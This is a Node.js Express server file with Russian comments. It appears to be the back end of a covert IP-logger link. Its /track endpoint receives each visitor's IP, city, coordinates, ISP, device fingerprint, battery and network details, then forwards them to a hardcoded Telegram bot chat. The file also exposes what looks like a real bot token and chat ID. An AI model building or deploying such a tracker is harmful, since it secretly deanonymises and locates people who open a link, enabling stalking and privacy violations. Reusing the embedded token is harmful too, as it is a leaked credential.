const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8080;

// 🔐 Твой Telegram бот
const TELEGRAM_TOKEN = '8045162630:AAEritxdtynKLUG2mr-C0TMIyc0UcDnlKNY';
const CHAT_ID = '1031226674'; // Твой Telegram ID

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/track', async (req, res) => {
  const d = req.body;

  const msg = `
🥔 <b>Новый переход</b>

🌍 <b>IP:</b> ${d.ip}
📍 <b>Город:</b> ${d.city}, ${d.region}, ${d.country}
🛰 <b>Провайдер:</b> ${d.org}
🧭 <b>Координаты:</b> ${d.loc}
🕓 <b>Часовой пояс:</b> ${d.timezone} (offset: ${d.timezoneOffset})

📱 <b>Устройство:</b> ${d.device}
💻 <b>Платформа:</b> ${d.platform} (${d.architecture})
🧩 <b>User-Agent:</b> ${d.userAgent}
📦 <b>UA Brands:</b> ${d.brands}
📏 <b>Экран:</b> ${d.screen}
🌐 <b>Язык:</b> ${d.language}
👆 <b>Сенсор:</b> ${d.touchSupport ? 'Да' : 'Нет'}
💾 <b>Память:</b> ${d.memory}
🔌 <b>Онлайн:</b> ${d.online}

📶 <b>Сеть:</b> ${d.network} / ${d.downlink}
🔋 <b>Батарея:</b> ${d.battery} | Зарядка: ${d.charging}
  `;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: msg,
      parse_mode: 'HTML'
    });

    res.sendStatus(200);
  } catch (e) {
    console.error('❌ Ошибка при отправке в Telegram:', e.message);
    res.sendStatus(500);
  }
});

app.listen(PORT, () => {
  console.log(`✅ Сервер запущен на http://localhost:${PORT}`);
});
